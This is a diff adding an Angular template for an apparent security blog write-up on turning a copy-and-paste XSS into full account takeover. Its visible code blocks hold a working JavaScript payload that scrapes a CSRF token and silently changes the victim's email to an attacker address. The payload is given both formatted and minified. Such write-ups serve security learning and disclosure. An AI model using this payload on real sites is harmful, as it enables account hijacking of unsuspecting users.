@@ -1,0 +1,111 @@
+<div class="whitespace" style="height: 85px;"></div>
+<div class="col-12 mx-auto text-center">
+	<div class="col-8 mx-auto text-center">
+		<h3 class="title">{{ title }}</h3><br>
+	</div>
+	<div class="info">
+		<h4><a routerLink="/about">0xblackbird</a> - <span (click)="displayPublishDate()">{{ publishDate | fromNow }}</span></h4>
+	</div>
+	<img src="{{ image }}" class="img-fluid rounded img-b" draggable="false">
+</div>
+<div class="col-12 mx-auto text-left intro">
+	<p innerHTML="{{ 'blogComponent.post0.intro' | translate }}"></p>
+</div>
+<div class="col-12 mx-auto text-left blog-body">
+	<h3>{{ 'blogComponent.post0.body.target.target' | translate }}</h3>
+	<p innerHTML="{{ 'blogComponent.post0.body.target.paragraph' | translate }}"></p>
+</div>
+
+<div class="col-12 mx-auto text-left blog-body">
+	<h3>{{ 'blogComponent.post0.body.attackScenario.attackScenario' | translate }}</h3>
+	<p>{{ 'blogComponent.post0.body.attackScenario.paragraph' | translate }}<br><br></p>
+		<ul class="list-group">
+	  		<li class="list-group-item d-flex align-items-left">
+	    		<p innerHTML="{{ 'blogComponent.post0.body.attackScenario.steps.step0' | translate }}"></p>
+	  		</li>
+	  		<li class="list-group-item d-flex align-items-center">
+	    		<p innerHTML="{{ 'blogComponent.post0.body.attackScenario.steps.step1' | translate }}"></p>
+	  		</li>
+	  		<li class="list-group-item d-flex align-items-center">
+	    		<p innerHTML="{{ 'blogComponent.post0.body.attackScenario.steps.step2' | translate }}"></p>
+			</li>
+			<li class="list-group-item d-flex align-items-center">
+	    		<p innerHTML="{{ 'blogComponent.post0.body.attackScenario.steps.step3' | translate }}"></p>
+	    	</li>
+	    	<li class="list-group-item d-flex align-items-center">
+	    		<p innerHTML="{{ 'blogComponent.post0.body.attackScenario.steps.step4' | translate }}"></p>
+	    	</li>
+		</ul>
+</div>
+<div class="col-12 mx-auto text-left blog-body">
+	<p innerHTML="{{ 'blogComponent.post0.body.steps.step0.paragraph' | translate }}"></p>
+	<div class="space-b"></div>
+	<p innerHTML="{{ 'blogComponent.post0.body.steps.step1.paragraph' | translate }}"></p>
+	<div class="space-b"></div>
+	<div matTooltip="{{ 'blogComponent.post0.body.steps.step1.toolTip' | translate }}">
+		<code>document.execCommand(‘cut’/‘copy’) was denied because it was not called from inside a short running user-generated event handler.</code>
+	</div>
+	<div class="space-b"></div>
+	<p>{{ 'blogComponent.post0.body.steps.step1.paragraph1' | translate }}</p>
+	<div class="card mb-3 text-center">
+		<img src="/assets/posts/post0/img.png" class="card-img-top" alt="image">
+		<p class="card-text"><small class="text-muted">{{ 'blogComponent.post0.body.steps.step1.mutedText' | translate }}</small></p>
+	</div>
+	<div class="space-b"></div>
+	<p>{{ 'blogComponent.post0.body.steps.step1.paragraph2' | translate }}</p>
+	<div class="space-b"></div>
+	<div class="card mb-3 text-center">
+		<img src="/assets/posts/post0/img1.png" class="card-img-top" alt="image">
+		<p class="card-text"><small class="text-muted">{{ 'blogComponent.post0.body.steps.step1.mutedText1' | translate }}</small></p>
+	</div>
+	<div class="space-b"></div>
+	<div class="alert alert-success" role="alert">
+		<h4 class="alert-heading text-uppercase font-weight-bold">{{ 'blogComponent.post0.body.steps.step1.alert.tryIt' | translate }}</h4>
+		<p><a (click)="copyTags();" class="copy-btn">{{ 'blogComponent.post0.body.steps.step1.alert.click' | translate }}</a><span innerHTML="{{ 'blogComponent.post0.body.steps.step1.alert.paragraph' | translate }}"></span></p>
+	</div>
+	<div class="space-b"></div>
+	<p innerHTML="{{ 'blogComponent.post0.body.steps.step2.paragraph' | translate }}"></p>
+	<div class="space-b"></div>
+	<p innerHTML="{{ 'blogComponent.post0.body.steps.step3.paragraph' | translate }}"></p>
+	<div class="space-b"></div>
+	<p>{{ 'blogComponent.post0.body.steps.step3.paragraph1' | translate }}</p>
+	<code>
+		var req = new XMLHttpRequest();<br>
+		var url = &quot;/&quot;;<br>
+		<span matTooltip="{{ 'blogComponent.post0.body.steps.step3.toolTip' | translate }}">var regex = /_csrf_token&quot; value=&quot;([^&quot;]*?)&quot;/g;</span><br>
+		req.open(&quot;GET&quot;, url, false);<br>
+		req.send();<br>
+		var token = regex.exec(req.responseText);<br>
+		var token = token[1];<br>
+	</code>
+	<div class="space-b"></div>
+	<p innerHTML="{{ 'blogComponent.post0.body.steps.step3.paragraph2' | translate }}"></p>
+	<code>
+		req.open(&quot;POST&quot;, url, true);<br>
+		req.setRequestHeader(&quot;Content-Type&quot;, &quot;application\/x-www-form-urlencoded&quot;);<br>
+		req.withCredentials = true;<br>
+		var body = &quot;email=attacker@example.com&_csrf_token=&quot;+token<br>
+		var aBody = new Uint8Array(body.length);<br>
+		for (var i = 0; i &lt; aBody.length; i++)<br>
+			aBody[i] = body.charCodeAt(i);<br>
+		req.send(new Blob([aBody]));<br>
+	</code>
+	<div class="space-b"></div>
+	<p>{{ 'blogComponent.post0.body.steps.step3.paragraph3' | translate }}</p>
+	<code>
+		var req=new XMLHttpRequest();var url=&quot;/&quot;;var regex=/_csrf_token&quot; value=&quot;([^&quot;]*?)&quot;/g;req.open(&quot;GET&quot;,url,false);req.send();var token=regex.exec(req.responseText);var token=token[1];req.open(&quot;POST&quot;,url,true);req.setRequestHeader(&quot;Content-Type&quot;,&quot;application\/x-www-form-urlencoded&quot;);req.withCredentials=true;var body=&quot;email=attacker@example.com&_csrf_token=&quot;+token;var aBody=new Uint8Array(body.length);for(var i=0;i&lt;aBody.length;i+=1)&#123;aBody[i]=body.charCodeAt(i)&#125;req.send(new Blob([aBody]));
+	</code>
+	<div class="space-b"></div>
+	<p innerHTML="{{ 'blogComponent.post0.body.steps.step3.paragraph4' | translate }}"></p>
+	<div class="space-b"></div>
+	<p innerHTML="{{ 'blogComponent.post0.body.steps.step4.paragraph' | translate }}"></p>
+	<div class="space-b"></div>
+	<p>{{ 'blogComponent.post0.body.end' | translate }}</p>
+	<div class="whitespace"></div>
+	<div class="text-center mx-auto share">
+		<h3 class="text-center">{{ 'blogComponent.post0.body.share' | translate }}</h3>
+		<div class="space-b"></div>
+		<h2><a href="https://twitter.com/intent/tweet?text=FROM%20COPY%26PASTE%20XSS%20TO%20FULL%20ACCOUNT%20TAKEOVER!%20A%20blog%20post%20by%20%400xblackbird%0A%0Ahttps%3A//0xblackbird.github.io/cG9zdDAK" target="_blank"><span>Twitter </span> <fa-icon class="twitter-icon" [icon]="faTwitter"></fa-icon></a></h2>
+	</div>
+</div>
+<div class="whitespace"></div>
